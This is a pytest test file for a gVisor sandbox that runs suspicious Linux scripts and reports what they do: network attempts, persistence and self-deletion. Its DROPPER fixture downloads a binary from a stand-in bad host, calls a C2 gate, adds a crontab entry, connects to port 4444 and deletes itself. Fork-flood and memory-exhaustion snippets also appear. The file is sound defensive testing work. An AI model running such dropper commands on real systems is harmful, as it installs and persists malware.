# ruff: noqa: S108 - /tmp paths here are inside the sandbox, from its trace.
"""Sandbox runs of Linux programs and scripts in gVisor (Wave 4.C)."""

import os
import shutil
import socket
import struct
from pathlib import Path

import pytest

from app.analyzers.types import Outcome
from app.sandbox import detonation, sink
from app.sandbox.detonation import DetonationLimits, DetonationResult, Trace

FIXTURES = Path(__file__).with_name("fixtures")
DROPPER = """#!/bin/sh
curl -fsS http://update.example-bad.test/x86.bin -o /tmp/.x 2>/dev/null
python3 -c "import urllib.request; urllib.request.urlopen('http://c2.example-bad.test/gate.php', timeout=2)" 2>/dev/null
echo '* * * * * /tmp/.x' >> /etc/crontab 2>/dev/null
echo x > /tmp/.y; chmod +x /tmp/.y
python3 -c "import socket; s=socket.socket(); s.settimeout(1); s.connect_ex(('203.0.113.7', 4444))"
rm -f "$0"
"""


def test_only_linux_programs_and_scripts_are_run() -> None:
    assert detonation.kind_for("elf", "a.out", b"\x7fELF") == "elf"
    assert detonation.kind_for("text", "x", b"#!/bin/bash\necho") == "sh"
    assert detonation.kind_for("text", "x", b"#!/usr/bin/env python3\n") == "python"
    assert detonation.kind_for("text", "tool.pl", b"print 1;") == "perl"
    assert detonation.kind_for("pe", "setup.exe", b"MZ") is None
    assert detonation.kind_for("macho", "app", b"\xcf\xfa\xed\xfe") is None
    assert detonation.kind_for("text", "notes.txt", b"hello") is None


def test_the_sandbox_has_no_network_a_read_only_root_and_limits(tmp_path: Path) -> None:
    sample = tmp_path / "s.sh"
    sample.write_text("echo hi")
    limits = DetonationLimits(seconds=10, memory_mb=128, pids=32, tmp_mb=16)
    bundle = detonation.prepare_bundle(tmp_path / "w", sample, "sh", limits, "/srv/rootfs")
    import json

    config = json.loads((bundle / "config.json").read_text())
    assert config["root"] == {"path": "/srv/rootfs", "readonly": True}
    assert config["process"]["noNewPrivileges"] is True
    assert {"type": "network"} in config["linux"]["namespaces"]
    res = config["linux"]["resources"]
    assert res["memory"]["limit"] == (128 + detonation.SANDBOX_OVERHEAD_MB) * 1024 * 1024
    assert res["pids"]["limit"] > 32
    assert "128" in config["process"]["args"], "the sample's own memory cap is passed to the sink"
    mounts = {m["destination"]: m for m in config["mounts"]}
    assert "ro" in mounts["/sample"]["options"] and "ro" in mounts["/qalaa"]["options"]
    assert "size=16m" in mounts["/tmp"]["options"]
    assert not any(m["type"] == "bind" and "ro" not in m["options"] for m in config["mounts"]), (
        "no writable binds"
    )
    assert (bundle / "resolv.conf").read_text().startswith("nameserver 127.0.0.1")
    assert os.access(bundle / "sample" / "run", os.X_OK)
    argv = detonation.runsc_argv("/usr/bin/runsc", bundle, tmp_path / "logs", "c1")
    assert "--network=none" in argv and "--strace" in argv


def test_gvisor_trace_lines_are_read() -> None:
    trace = detonation.parse_strace((FIXTURES / "gvisor-strace.txt").read_text())
    assert trace.executed[0]["path"] == "/bin/sh" and trace.executed[0]["argv"] == [
        "/bin/sh",
        "/sample/run",
    ]
    assert {"addr": "203.0.113.7", "port": 4444, "ok": False, "by": "python3"} in trace.connects
    assert all(c["addr"] != '"/var/run/nscd/socket"' for c in trace.connects), (
        "unix sockets aren't network"
    )
    assert trace.deleted == ["/sample/run"]
    assert trace.chmod_exec == ["/tmp/.y"]
    assert {"path": "/etc/crontab", "ok": False, "by": "sh"} in trace.writes
    assert detonation.parse_strace("garbage\nI1125 nothing here").executed == []


def test_the_fake_dns_answers_every_name_with_loopback() -> None:
    query = (
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        + b"\x03c2x\x07example\x00"
        + struct.pack("!HH", 1, 1)
    )
    parsed = sink.parse_dns_query(query)
    assert parsed is not None and parsed[1] == "c2x.example" and parsed[2] == 1
    answer = sink.dns_answer(query)
    assert (
        answer is not None
        and answer[:2] == b"\x12\x34"
        and answer.endswith(socket.inet_aton("127.0.0.1"))
    )
    assert sink.parse_dns_query(b"\x00" * 5) is None
    assert (
        sink.parse_dns_query(struct.pack("!HHHHHH", 1, 0, 1, 0, 0, 0) + b"\xc0\x0c") is None
    )  # pointer loop
    aaaa = query[:-4] + struct.pack("!HH", 28, 1)
    assert (
        sink.dns_answer(aaaa) is not None
        and struct.unpack("!H", sink.dns_answer(aaaa)[6:8])[0] == 0
    )  # type: ignore[index]


def test_the_fake_web_server_reads_requests() -> None:
    req = sink.parse_http_head(b"GET /x86.bin HTTP/1.1\r\nHost: bad.test\r\nUser-Agent: curl/8\r\n")
    assert req == {"method": "GET", "path": "/x86.bin", "host": "bad.test", "user_agent": "curl/8"}
    assert sink.parse_http_head(b"\x16\x03\x01 binary") is None


def test_behaviours_become_findings_never_known_malware() -> None:
    trace = Trace(
        executed=[
            {"path": "/bin/sh", "argv": [], "ok": True, "by": "python3"},
            {"path": "/usr/bin/curl", "argv": [], "ok": True, "by": "sh"},
            {"path": "/usr/bin/crontab", "argv": [], "ok": True, "by": "sh"},
        ],
        writes=[{"path": "/home/u/.bashrc", "ok": False, "by": "sh"}],
        connects=[
            {"addr": "127.0.0.1", "port": 53, "ok": True, "by": "curl"},
            {"addr": "198.51.100.9", "port": 6667, "ok": False, "by": "x"},
        ],
        deleted=["/sample/run"],
        ptrace_self=True,
        chmod_exec=["/tmp/.y"],
    )
    result = DetonationResult(
        True,
        None,
        trace,
        {
            "status": {"exit": 0},
            "seconds": 1.2,
            "events": [
                {"kind": "dns", "name": "bad.test"},
                {"kind": "http", "method": "GET", "host": "bad.test", "path": "/bot.arm7"},
            ],
        },
    )
    findings = detonation.findings_for(result)
    titles = {f.title for f in findings}
    assert titles == {
        "Tries to reach internet addresses",
        "Downloads more code from the internet",
        "Connects straight to IP addresses",
        "Starts download or network tools",
        "Tries to make itself start again or keep access",
        "Deletes itself after it runs",
        "Checks whether it is being watched",
        "Writes a program to disk and makes it runnable",
    }
    assert all(f.category != "known_signature" and f.severity != "critical" for f in findings)
    assert next(f for f in findings if f.title.startswith("Connects")).evidence["addresses"] == [
        "198.51.100.9:6667"
    ]
    clean = DetonationResult(
        True,
        None,
        Trace(executed=[{"path": "/bin/sh", "argv": [], "ok": True, "by": "python3"}]),
        {"status": {"exit": 0}, "events": []},
    )
    assert detonation.findings_for(clean) == []


def test_reporting_states_limits_and_failures() -> None:
    outcome = Outcome()
    detonation.merge_detonation(
        outcome, DetonationResult(False, "the sandbox didn't start (boom)"), DetonationLimits()
    )
    assert outcome.checks[0].status == "failed" and "boom" in outcome.checks[0].detail
    ok = Outcome()
    detonation.merge_detonation(
        ok,
        DetonationResult(True, None, Trace(), {"status": {"timed_out": True}, "events": []}),
        DetonationLimits(seconds=30),
    )
    assert ok.checks[0].status == "completed" and "time limit" in ok.checks[0].detail
    assert any("isn't proof" in lim for lim in ok.limitations)


def test_without_a_configured_sandbox_it_says_so(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from app.analyzers import file_scan, file_types
    from app.core.config import get_settings

    monkeypatch.setattr(get_settings(), "detonation_runsc", None)
    sample = tmp_path / "x.sh"
    sample.write_text("#!/bin/sh\necho hi\n")
    outcome = Outcome()
    file_scan.sandbox_run_check(sample, "x.sh", file_types.identify(sample), outcome)
    assert outcome.checks[0].status == "unavailable" and "no sandbox" in outcome.checks[0].detail
    exe = tmp_path / "setup.exe"
    exe.write_bytes(b"MZ" + b"\0" * 200)
    win = Outcome()
    file_scan.sandbox_run_check(exe, "setup.exe", file_types.identify(exe), win)
    assert "Windows and macOS programs aren't run" in win.checks[0].detail


RUNSC = os.environ.get("QALAA_TEST_RUNSC")


@pytest.mark.skipif(
    not RUNSC or os.geteuid() != 0, reason="set QALAA_TEST_RUNSC=/path/to/runsc and run as root"
)
def test_a_real_run_in_gvisor(tmp_path: Path) -> None:
    sample = tmp_path / "dropper.sh"
    sample.write_text(DROPPER)
    result = detonation.run_detonation(
        sample,
        "sh",
        str(RUNSC),
        "/",
        DetonationLimits(seconds=20),
        os.environ.get("QALAA_TEST_RUNSC_PLATFORM", "systrap"),
    )
    assert result.ok, result.reason
    titles = {f.title for f in detonation.findings_for(result)}
    assert {
        "Tries to reach internet addresses",
        "Connects straight to IP addresses",
        "Tries to make itself start again or keep access",
        "Deletes itself after it runs",
    } <= titles
    names = {e["name"] for e in result.sink["events"] if e["kind"] == "dns"}
    assert "c2.example-bad.test" in names
    if shutil.which("curl"):
        assert "Downloads more code from the internet" in titles


def test_refused_process_starts_are_counted() -> None:
    line = "I1125 16:54:48.477765       1 strace.go:606] [  33:  33] sh X clone(0x1200011, 0x0, 0x0, 0x7f, 0x0) = -1 errno=11 (resource temporarily unavailable) (3µs)"
    trace = detonation.parse_strace("\n".join([line] * 3))
    assert trace.process_limit_hits == 3
    result = DetonationResult(True, None, trace, {"status": {"exit": 0}, "events": []})
    assert [f.title for f in detonation.findings_for(result)] == [
        "Tries to start a flood of processes"
    ]


def test_the_process_cap_is_inside_the_sandbox(tmp_path: Path) -> None:
    import json

    sample = tmp_path / "s.sh"
    sample.write_text("true")
    config = json.loads(
        (
            detonation.prepare_bundle(tmp_path / "w", sample, "sh", DetonationLimits(pids=40), "/")
            / "config.json"
        ).read_text()
    )
    nproc = next(r for r in config["process"]["rlimits"] if r["type"] == "RLIMIT_NPROC")
    assert nproc["hard"] == 40
    # The host cgroup cap is looser, so gVisor itself stays up to report what happened.
    assert config["linux"]["resources"]["pids"]["limit"] > 40


def real(script: str, tmp_path: Path, kind: str = "sh", **limits: int) -> DetonationResult:
    sample = tmp_path / "sample"
    sample.write_text(script)
    return detonation.run_detonation(
        sample,
        kind,
        str(RUNSC),
        "/",
        DetonationLimits(**limits),
        os.environ.get("QALAA_TEST_RUNSC_PLATFORM", "systrap"),
    )


needs_runsc = pytest.mark.skipif(
    not RUNSC or os.geteuid() != 0, reason="set QALAA_TEST_RUNSC=/path/to/runsc and run as root"
)


@needs_runsc
def test_a_sample_that_never_ends_is_stopped_at_the_time_limit(tmp_path: Path) -> None:
    import time

    started = time.monotonic()
    result = real("#!/bin/sh\nsleep 300 &\nsleep 300\n", tmp_path, seconds=5)
    assert result.ok, result.reason
    assert result.sink["status"]["timed_out"] is True
    assert time.monotonic() - started < 30, "the run, children included, ends soon after the limit"


@needs_runsc
def test_memory_is_capped(tmp_path: Path) -> None:
    script = "b=[]\ntry:\n    for _ in range(64):\n        b.append(bytearray(32 << 20))\n    print('ALLOCATED')\nexcept MemoryError:\n    print('refused')\n"
    result = real(script, tmp_path, kind="python", seconds=15, memory_mb=128)
    assert result.ok, result.reason
    assert result.sink["status"]["exit"] != 0 or result.sink["status"].get("stdout_bytes", 0) < len(
        "ALLOCATED"
    )


@needs_runsc
def test_a_fork_flood_is_refused_inside_the_sandbox(tmp_path: Path) -> None:
    result = real(
        "#!/bin/sh\nfor i in $(seq 1 150); do (sleep 30 &) 2>/dev/null; done\n",
        tmp_path,
        seconds=8,
        pids=32,
    )
    assert result.ok, result.reason
    assert result.trace.process_limit_hits > 0
    assert "Tries to start a flood of processes" in {
        f.title for f in detonation.findings_for(result)
    }


@needs_runsc
def test_no_network_and_a_read_only_system(tmp_path: Path) -> None:
    script = (
        "#!/bin/sh\n"
        "echo x > /etc/qalaa-test\n"
        "python3 -c \"import socket; s=socket.socket(); s.settimeout(2); raise SystemExit(0 if s.connect_ex(('1.1.1.1', 443)) else 9)\"\n"
    )
    result = real(script, tmp_path, seconds=15)
    assert result.ok, result.reason
    assert "Read-only file system" in result.sink["status"]["stderr_tail"]
    assert result.sink["status"]["exit"] == 0, "connecting out failed: there is no network"
    assert any(c["addr"] == "1.1.1.1" and not c["ok"] for c in result.trace.connects)


def test_the_report_lists_what_the_run_tried_to_reach() -> None:
    trace = Trace(
        executed=[
            {"path": "/bin/sh", "argv": [], "ok": True, "by": "python3"},
            {"path": "/usr/bin/curl", "argv": [], "ok": True, "by": "sh"},
        ],
        connects=[
            {"addr": "127.0.0.1", "port": 53, "ok": True, "by": "curl"},
            {"addr": "203.0.113.7", "port": 4444, "ok": False, "by": "x"},
        ],
    )
    sink = {
        "status": {"exit": 0},
        "seconds": 2.5,
        "events": [
            {"kind": "dns", "name": "c2.bad.test"},
            {"kind": "http", "method": "GET", "host": "c2.bad.test", "path": "/gate.php"},
        ],
    }
    outcome = Outcome()
    detonation.merge_detonation(
        outcome, DetonationResult(True, None, trace, sink), DetonationLimits()
    )
    d = outcome.details["detonation"]
    assert d["dns_lookups"] == ["c2.bad.test"]
    assert d["web_requests"] == ["GET c2.bad.test/gate.php"]
    assert d["direct_connections"] == ["203.0.113.7:4444"]
    assert d["programs"] == ["curl"] and d["seconds"] == 2.5 and d["timed_out"] is False
